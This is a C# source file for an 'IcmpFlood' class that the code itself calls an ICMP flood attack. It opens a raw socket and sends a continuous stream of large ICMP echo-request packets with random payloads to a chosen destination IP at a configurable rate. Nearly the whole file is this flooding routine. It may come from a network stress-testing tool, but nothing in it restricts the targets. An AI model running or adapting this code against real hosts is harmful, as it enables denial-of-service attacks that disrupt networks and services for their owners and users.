using System;
using System.Linq;
using System.Net;
using System.Net.NetworkInformation;
using System.Runtime.InteropServices;
using System.Threading;
using System.Threading.Tasks;
using NLog;
using PacketDotNet;
using SharpPcap;
using SharpPcap.LibPcap;
using Dorothy.Models;
using System.Net.Sockets;

namespace Dorothy.Models
{
    public class IcmpFlood : IDisposable
    {
        private static readonly ILogger Logger = LogManager.GetCurrentClassLogger();
        private readonly PacketParameters _params;
        private readonly CancellationToken _cancellationToken;
        private Socket? _socket;

        public IcmpFlood(PacketParameters parameters, CancellationToken cancellationToken)
        {
            _params = parameters;
            _cancellationToken = cancellationToken;
        }

        public async Task StartAsync()
        {
            Logger.Info("Starting ICMP Flood attack.");

            try
            {
                _socket = new Socket(AddressFamily.InterNetwork, SocketType.Raw, System.Net.Sockets.ProtocolType.Icmp);
                _socket.SetSocketOption(SocketOptionLevel.IP, SocketOptionName.HeaderIncluded, false);

                byte[] icmpHeader = new byte[8];
                byte[] payload = new byte[1400];

                var random = new Random();
                int packetSize = icmpHeader.Length + payload.Length;
                int packetsPerSecond = (int)Math.Ceiling(_params.BytesPerSecond / (double)packetSize);

                await Task.Run(() =>
                {
                    while (!_cancellationToken.IsCancellationRequested)
                    {
                        try
                        {
                            icmpHeader[0] = 8;  // Echo Request
                            random.NextBytes(payload);

                            byte[] fullPacket = new byte[icmpHeader.Length + payload.Length];
                            Buffer.BlockCopy(icmpHeader, 0, fullPacket, 0, icmpHeader.Length);
                            Buffer.BlockCopy(payload, 0, fullPacket, icmpHeader.Length, payload.Length);

                            var endpoint = new IPEndPoint(_params.DestinationIp, 0);
                            _socket.SendTo(fullPacket, endpoint);

                            if (packetsPerSecond > 0)
                                Thread.Sleep(1000 / packetsPerSecond);
                        }
                        catch (Exception ex)
                        {
                            Logger.Error(ex, "Failed sending ICMP packet (Layer 3).");
                        }
                    }
                }, _cancellationToken);
            }
            catch (Exception ex)
            {
                Logger.Error(ex, "ICMP Flood attack failed.");
                throw;
            }
        }

        public void Dispose()
        {
            _socket?.Dispose();
        }

        [DllImport("iphlpapi.dll", ExactSpelling = true)]
        private static extern int SendARP(int DestIP, int SrcIP, byte[] pMacAddr, ref int PhyAddrLen);
    }
} 